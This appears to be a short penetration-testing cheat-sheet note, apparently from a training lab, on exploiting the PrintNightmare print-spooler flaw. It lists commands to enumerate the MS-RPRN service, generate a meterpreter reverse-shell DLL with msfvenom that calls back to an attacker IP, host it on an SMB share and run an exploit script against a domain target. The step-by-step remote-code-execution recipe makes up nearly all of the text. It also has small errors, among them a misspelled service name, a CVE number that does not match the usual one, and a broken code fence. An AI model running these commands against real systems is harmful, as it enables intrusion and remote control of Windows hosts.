
Print Nightmare( use need cube0x0 version of Impacket)
Enumerate the MS-RPRN service
```
rpcdump.py @172.16.5.5 | egrep 'MR-RPRN|MS-PAR'
```
if it is running you will need to generate a DLL payload
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```
start a SMB share
```
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
```

Start a MSF handler to catch call back
Print Nightmare exploit
```
sudo python3 CVE-2021-1657.py inlanefreight.local/USER:Password@172.16.5.225 '\\172.16.5.225\CompData\backupscript.dll'
``
```


